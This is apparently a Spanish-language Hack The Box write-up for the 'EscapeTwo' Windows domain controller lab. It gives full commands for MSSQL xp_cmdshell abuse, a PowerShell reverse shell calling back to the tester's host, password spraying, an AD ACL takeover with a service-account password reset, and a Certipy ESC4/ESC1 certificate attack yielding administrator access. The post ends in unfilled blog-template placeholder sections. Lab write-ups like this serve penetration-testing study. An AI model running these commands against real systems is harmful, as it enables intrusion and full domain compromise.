---
title: EscapeTwo - Hackthebox - Season7
date: 2025-01-21 
categories: [Labs & CTF, Windows, Walktrought]
tags: [Pentest, windows, ctf, Hackthebox, labs] 
image:
  path: /assets/img/posts/escapeTwo/cabecera.png
  alt: EscapeTwo
description: >
  Hackthebox EscapeTwo Active Directory Guia en español
pin: false  
toc: true   
math: false 
mermaid: false 
---
## Escaneo NMAP

```bash
nmap -sC -sV --open 10.10.11.51
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 14:27 CET
Nmap scan report for 10.10.11.51
Host is up (0.055s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-21 13:28:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-21T13:29:58+00:00; +35s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-21T13:29:58+00:00; +35s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-01-21T13:29:58+00:00; +35s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-21T12:19:05
|_Not valid after:  2055-01-21T12:19:05
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-21T13:29:58+00:00; +35s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-21T13:29:58+00:00; +35s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 34s, deviation: 0s, median: 34s
| smb2-time: 
|   date: 2025-01-21T13:29:23
|_  start_date: N/A
```
### Análisis

Es un Active Directory Domain Controller (DC01.sequel.htb) con servicios típicos:

- DNS (53/tcp)
- Kerberos (88/tcp)
- LDAP (389/tcp, 636/tcp, 3268/tcp, 3269/tcp)
- SMB (445/tcp)
- RPC (135/tcp, 593/tcp)

Lo más interesante es que tiene SQL Server 2019 (puerto 1433) en su versión RTM 15.00.2000.00
También tiene habilitado WinRM (puerto 5985) que permite administración remota

Algunos detalles importantes:

- Dominio: sequel.htb
- Hostname: DC01.sequel.htb
- Sistema Operativo: Windows Server (versión 10.0.17763)

## Acceso MSSQL 

Como en el CTF se nos proporcionan unas credenciales podemos probar a verificar con que servicios se puede acceder.
```bash
crackmapexec smb 10.10.11.51 -u 'sequel.htb\rose' -p 'KxEPkKe6R8su'
crackmapexec winrm 10.10.11.51 -u 'sequel.htb\rose' -p 'KxEPkKe6R8su'
crackmapexec mssql 10.10.11.51 -u 'sequel.htb\rose' -p 'KxEPkKe6R8su'
```
Entre estas opciones encontramos que el servicio MSSQL es accesible.

```bash
impacket-mssqlclient sequel.htb/rose:KxEPkKe6R8su@10.10.11.51 -windows-auth
```
[![SQL](/assets/img/posts/escapeTwo/sql_rose.png)](/assets/img/posts/escapeTwo/sql_rose.png)

Tras un rato indagando vemos que el usuario proporcionado solo tiene permisos de consulta, pero si observamos los roles dentro de las bases de datos observamos un 
usuario "sa" que tiene permisos de administrador.

Por ahora nada más interesante por aqui.

Probamos a acceder por SMB para ver si conseguimos alguna información.

```bash
impacket-smbclient sequel.htb/rose:KxEPkKe6R8su@10.10.11.51
```
[![SMB](/assets/img/posts/escapeTwo/smb_rose.png)](/assets/img/posts/escapeTwo/smb_rose.png)

Vemos dos archivos xlsx que pueden ser interesante, si accedemos al contenido vamos a encontrar buena información.

[![Excel](/assets/img/posts/escapeTwo/xlsx_usuarios.png)](/assets/img/posts/escapeTwo/xlsx_usuarios.png)

Perfecto ahora con esta información si nos fijamos en el usuario "sa" su contraseña por lo que podemos probarla en el servicio MSSQL o winrm para ver si conseguimos acceos.

[![CRACKMAP](/assets/img/posts/escapeTwo/crack_sa.png)](/assets/img/posts/escapeTwo/crack_sa.png)

No tiene acceso SMB pero si cuenta con acceso MSSQL ya que el error que indica es de certificados y no de login.

```bash
impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51 -windows-auth
```
## Shell reversa de MSSQL

Ahora que estás como 'sa' (sysadmin), podemos habilitar y usar xp_cmdshell para ejecutar comandos del sistema.

```sql
-- Primero habilitamos las configuraciones avanzadas
sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Luego habilitamos xp_cmdshell
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Probamos si funciona con un whoami
EXEC xp_cmdshell 'whoami';
```

Ahora que tenemos capacidad para ejecutar comandos del sistema, podemos usar la herramienta de shell reversa de MSSQL para ejecutar comandos en el sistema.

```sql
EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.16.13'',9000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```
> **Nota**: Recuerda habilitar el puerto de escucha en tu máquina linux.
{: .prompt-info }

[![SQL](/assets/img/posts/escapeTwo/sql_sa.png)](/assets/img/posts/escapeTwo/sql_sa.png)

[![SHELL](/assets/img/posts/escapeTwo/shell_sa.png)](/assets/img/posts/escapeTwo/shell_sa.png)

## User Flag

[![Flag](/assets/img/posts/escapeTwo/user_flag.png)](/assets/img/posts/escapeTwo/user_flag.png)

## Explorando el sistema.

Una vez que tenemos acceso a la shell, podemos explorar el sistema y ver si conseguimos alguna información.

Dando vueltas e investigando podemos encontrar el directorio de un usuario llamado "ryan" del que no tenemos acceso pero parece tener permisos para winrm.

[![SHELL](/assets/img/posts/escapeTwo/sa_users.png)](/assets/img/posts/escapeTwo/sa_users.png)

Aunque esta cuenta no tiene muchos permisos en el sistema podemos intentar acceder a la configuración de sql y ver si conseguimos alguna información.

[![SHELL](/assets/img/posts/escapeTwo/sql-conf_info.png)](/assets/img/posts/escapeTwo/sql-conf_info.png)

Viendo estos archivos de configuración vemos otra contraseña hardcodeada para un usuario llamado "sql_svc"

Podemos añadirlos a los archivos de usuarios y contraseñas que ya tenemos e intentar hacer un password spraying.

[![TERM](/assets/img/posts/escapeTwo/passwords.png)](/assets/img/posts/escapeTwo/passwords.png)

```bash
crackmapexec winrm 10.10.11.51 -u users.txt -p passwords.txt
```
[![CRACKMAP](/assets/img/posts/escapeTwo/ryan_pwned.png)](/assets/img/posts/escapeTwo/ryan_pwned.png)

Parece ser que el usuario "ryan" tiene la misma contraseña que el servicio "sql_svc" y podemos probar a acceder al sistema por winrm.

```bash
evil-winrm -i 10.10.11.51 -u ryan -p 'la_contraseña_encontrada'
```
[![WINRM](/assets/img/posts/escapeTwo/ryan_permisos.png)](/assets/img/posts/escapeTwo/ryan_permisos.png)

Ryan es miembro del grupo "Management Department" y tiene acceso al "Certificate Service DCOM Access". Una vía de ataque podría ser a través de los certificados.

```powershell
# Ver servicios de certificados
Get-Service -Name "CertSvc"
certutil -dump

# Ver si tenemos permisos para solicitar certificados
certutil -CATemplates
```
Vemos que:

- CertSvc está corriendo
- Tenemos acceso denegado a las plantillas de certificados pero vemos que existen

Vamos a ver que usuarios hay en el dominio.

```powershell
Import-Module ActiveDirectory

Get-ADUser -Filter *
´´´
[![AD](/assets/img/posts/escapeTwo/certusers.png)](/assets/img/posts/escapeTwo/certusers.png)


Viendo los usuarios y sabiendo que podemos visualizar los certificados podemos intentar obtener los permisos de ryan sobre las ACLs de los certificados.

```powershell
Get-Acl "AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb" | Select -ExpandProperty Access
```
[![ACL](/assets/img/posts/escapeTwo/acls.png)](/assets/img/posts/escapeTwo/acls.png)

Vemos permisos de escritura en las keys de administración de los certificados.

Esto quiere decir que podemos intentar modificar la contraseña del usuario ca_svc e intentar obtener un certificado para obtener TGT como otro usuario.

```powershell
# Obtener el ACL actual
$acl = Get-Acl "AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb"

# Crear el objeto de identidad para ryan
$sid = (Get-ADUser ryan).SID
$identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$sid)
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $inheritanceType)

# Añadimos la nueva regla al ACL
$acl.AddAccessRule($rule)

# Establecer ryan como propietario
$acl.SetOwner($identity)

# Aplicar los cambios
Set-Acl "AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb" $acl

Set-ADAccountPassword -Identity "ca_svc" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
```
Ahora que hemos modificado la contraseña del usuario ca_svc podemos obtener el certificado.

## Escalada de privilegios

Vamos a listar las ACLs de los certificados que puedan ser vulnerables.

```bash
certipy-ad find -vulnerable -u ca_svc@sequel-htb -p Password123! -dc-ip 10.10.11.51
```
[![ACL](/assets/img/posts/escapeTwo/dumcert.png)](/assets/img/posts/escapeTwo/dumcert.png)

### Ataque de certificado ESC4 para obtener certificado de administrador

[Reference](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4)

ESC4 ocurre cuando un usuario tiene privilegios de escritura sobre una plantilla de certificado. Esto, por ejemplo, puede ser aprovechado para sobrescribir la configuración de la plantilla de certificado y hacer que la plantilla sea vulnerable a ESC1.

Así que, efectivamente, realizamos un ataque ESC1 sobrescribiendo la plantilla.

#### Copia original del certificado:

Como vamos a sobrescribir el certificado para realizar este ataque, haré una copia de seguridad.

```bash
certipy template -username ca_svc@sequel.htb -p Password123! -template DunderMifflinAuthentication -save-old
```
#### Ejecutar el ataque ESC1 

```bash
certipy-ad req -username ca_svc@sequel.htb -p Password123! -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51
```
[![ESC1](/assets/img/posts/escapeTwo/certificado_guardado.png)](/assets/img/posts/escapeTwo/certificado_guardado.png)

#### Autenticación como administrador

```bash
certipy-ad auth -pfx administrator.pfx -domain sequel.htb 
```
[![ESC1](/assets/img/posts/escapeTwo/certificado_admin.png)](/assets/img/posts/escapeTwo/certificado_admin.png)

```bash
evil-winrm -i 10.10.11.51 -u administrator -H $hash 
```
#### Root Flag

[![Flag](/assets/img/posts/escapeTwo/root_flag.png)](/assets/img/posts/escapeTwo/root_flag.png)


### Tablas

| Columna 1 | Columna 2 | Columna 3 |
|:----------|:----------:|----------:|
| Izquierda | Centrado | Derecha |
| Dato 1 | Dato 2 | Dato 3 |

### Imágenes

![Descripción de la imagen](/ruta/a/la/imagen.jpg)
_Pie de foto opcional_{: .text-center }

### Enlaces

[Texto del enlace](URL){:target="_blank"} <!-- Para abrir en nueva pestaña -->

## Elementos Especiales

### Fórmulas Matemáticas (requiere math: true)

$$
f(x) = x^2 + 2x + 1
$$

### Diagramas Mermaid (requiere mermaid: true)

```mermaid
graph TD;
    A-->B;
    A-->C;
    B-->D;
    C-->D;
```

## Conclusión

Resumen de los puntos principales y próximos pasos.

## Referencias

1. [Referencia 1](url1){:target="_blank"}
2. [Referencia 2](url2){:target="_blank"}

> **Nota**: Puedes usar blockquotes para destacar información importante
{: .prompt-info }

> **Advertencia**: O para advertencias
{: .prompt-warning }

> **Peligro**: O para alertas críticas
{: .prompt-danger }

> **Consejo**: O para tips útiles
{: .prompt-tip }